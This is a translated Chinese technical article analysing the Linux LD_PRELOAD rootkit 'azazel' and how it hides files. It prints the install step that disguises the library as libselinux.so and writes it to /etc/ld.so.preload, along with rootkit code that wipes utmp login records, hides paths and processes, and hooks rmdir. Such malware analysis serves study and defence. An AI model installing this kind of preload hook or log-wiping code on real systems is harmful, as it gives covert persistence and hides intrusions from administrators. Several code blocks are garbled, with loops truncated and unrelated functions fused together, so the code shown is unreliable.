# azazel linux下基于预加载的注入——文件隐藏篇
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
azazel是一个在liunx平台下进行动态注入的项目
先从makefile文件看
    INSTALL=/lib
    install: all
        @echo [-] Initiating Installation Directory $(INSTALL)
        @test -d $(INSTALL) || mkdir $(INSTALL)
        @echo [-] Installing azazel 
        @install -m 0755 libselinux.so $(INSTALL)/
        @echo [-] Injecting azazel
        @echo $(INSTALL)/libselinux.so > /etc/ld.so.preload
这一部分很简单
就是将`/lib/libaselinux.so` 写到 `etc/ld.so.preload` 中 . 利用的机制是库文件加载顺序.
在实验时 ,如果对应.so文件出问题 在每一次使用到链接库时都会出现error 但是不影响使用.报错类似如下
    ERROR: ld.so: object '/home/kai/Desktop/1.o' from /etc/ld.so.preload cannot be preloaded (only ET_DYN and ET_EXEC can be loaded): ignored
无法被预加载 其中只有ET_DYN和ET_EXEC类型文件能被加载
编译简单的库文件
    gcc 1.c -shared -fPIC -o lb.so
将对应路径添加到/etc/ld.so.preload
    echo $(pwd)/*.so > /etc/ld.so.preload
## azazel
azazel造成感染后的后果:
  * gdb无法使用
  * `bits/types/__sigset_t.h`无法找到
  * 每一个运行程序都被注入了对应的.so库
  * 魔改某一对应函数
清除方式 先删除libaselinux.so 再删除ld.so.perload内容
隐藏__开头 OR ld.so.preload 或者/proc/$pid/environ含有HIDE_THIS_SHELL有文件。
主要的文件只在azazel.c中
接下来逐步分析每一个函数的作用
## cleanup
    void cleanup(void *var, int len)
将`var`处 ,长度为`len`的地址清0,并且free该地址 , 与`strdupp`搭配使用
## init
    void azazel_init(void) {
        DEBUG("[-] azazel.so loaded.\n");
        int i, fd;
        if (constr)
            return;
        constr=1;
        for (i = 0; i 
    #include 
    #include
    void x(char *p) {
        int i, key=0xFE;
        for(i = 0; i =0){
            lseek(fd,0,SEEK_SET);
            while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
                if(!strncmp(utmp_ent.ut_line,pts,strlen(pts))){
                    memset(&utmp_ent,0x00,sizeof(utmp_ent));
                    lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
                    write(fd,&utmp_ent,sizeof(utmp_ent));
                }
            }
            close(fd);
        }
        if (verbose) {
            char *utmp_msg = strdup(UTMP_MSG);
            x(utmp_msg);
            printf("%s\n",utmp_msg);
            cleanup(utmp_msg, strlen(utmp_msg));
        }
        cleanup(utmp_file, strlen(utmp_file));
    }
几乎所有被hook的函数中都会出现`is_invisible`函数
## is_invisible
该函数的设计如下
    int is_invisible(const char *path) {
        DEBUG("is_invisible\n");
        struct stat s_fstat;
        char line[MAX_LEN];
        char p_path[PATH_MAX];
        char *config_file = strdup(CONFIG_FILE);
        FILE *cmd;    
        int fd;
        init();
        x(config_file);// ld.so.perload
        if(strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
            cleanup(config_file, strlen(config_file));
            return 1;
        }
        char *proc_path = strdup(PROC_PATH);
        x(proc_path);
        if(strstr(path, proc_path)){
            cleanup(proc_path,strlen(proc_path));
            if((long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat) != -1){
                char *cmd_line = strdup(CMD_LINE);
                char *env_line = strdup(ENV_LINE);
                x(cmd_line);
                x(env_line);
                snprintf(p_path, PATH_MAX, env_line, path);// /path/environ
                cleanup(cmd_line,strlen(cmd_line));// 
                cleanup(env_line, strlen(env_line));// 
                if((long)(syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, p_path, &s_fstat)) != -1){    
                    cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
                    if(cmd){
                        char *hide_term_str = strdup(HIDE_TERM_STR);
                        x(hide_term_str);
                        int res;
                        char *step = &line[0];
                        while((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                            if (parse_environ(line, MAX_LEN, hide_term_str) == 1) {
                                cleanup(config_file, strlen(config_file));
                                cleanup(hide_term_str, strlen(hide_term_str));
                                return 1;
                            }
                            memset(line,0x00,MAX_LEN);
                        }
                        fclose(cmd);                
                    }
                }
            }
        } else {
            cleanup(proc_path,strlen(proc_path));
        }
        cleanup(config_file,strlen(config_file));
        return 0;
    }
从名字上来看是判断是否文件是否可见 `config_file`是字符串`ld.so.preload` 即用来配置预加载文件的文件名
`MAGIC_STRING`是`__` .文件中含有这两个字符时,判断返回`1` 这也是为什么或会有一些文件无法使用
`proc_path`为`/proc/` 如果路径中含有`/proc/` 进入下一步处理. 通过在`init()`中获取到的函数地址来调用对应的函数
    (long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat)
这次使用的是`_xstat` 用来获取对应路径的属性 ,判断是否存在 ,
另外 `cmd_line`解析为`%s/cmdline` `env_line`解析为`%s/environ`
通过snprintf 获得`p_path` 内容为 组合成的`path/environ`
如果该文件存在 , 以只读方式打开文件 .
`hide_term_str`解析为`HIDE_THIS_SHELL`
将/environ文件内容拷贝到`line`中 .
如果它里面有`HIDE_THIS_SHELL`则`is_invisible`函数返回为1
    int parse_environ(char *stack, int len, char *needle) {
        DEBUG("parse_environ\n");
        char *step = stack;
        while(1) {
            if (strstr(step,needle))
                return 1;
            if (*step+1 != '\0') {
                step++;
                if (step-stack >= len) {
                    return 0;
                }
            } else
                return 0;
        }
    }
`paese_environ`作用是去除`\x0`再比对
举一个被hook函数的简单例子
    int rmdir(const char *pathname) {
        DEBUG("rmdir hooked.\n");
        if (is_owner()) 
            return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);
        if(is_invisible(pathname)) {
            errno = ENOENT;
            return -1;
        }
        return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);
    }
根据以上的解析 , 很容易理解它为什么能达到隐藏作用